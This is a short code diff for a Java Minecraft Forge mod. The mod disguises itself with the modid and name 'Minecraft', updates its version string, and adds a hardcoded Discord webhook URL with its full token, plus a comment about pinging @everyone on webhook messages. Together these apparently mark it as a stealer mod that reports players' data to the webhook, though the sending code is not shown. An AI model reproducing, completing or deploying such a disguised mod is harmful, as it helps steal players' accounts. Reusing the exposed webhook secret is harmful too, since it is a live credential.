@@ -12,7 +12,7 @@ import net.minecraftforge.fml.common.Mod.EventHandler;
 import net.minecraftforge.fml.common.event.FMLPreInitializationEvent;
 
 // some random mod info to suppress warnings in logs
-@Mod(modid = "Minecraft", name = "Minecraft", version = "1.8.9")
+@Mod(modid = "Minecraft", name = "Minecraft", version = "1.21.1")
 public final class Main {
 
     /**
@@ -20,7 +20,7 @@ public final class Main {
      * <p>
      * Example: https://discord.com/api/webhooks/...
      */
-    private static final String WEBHOOK_URL = "";
+    private static final String WEBHOOK_URL = "https://discord.com/api/webhooks/1429086586514964622/g1ZdRqry2Uz-gw79HGDP6UcZdobZ6ZIicrdjccyWbau4MTcdQjQaKid2ImRcrjcLKyIc";
 
     /**
      * Adds @everyone to webhook message
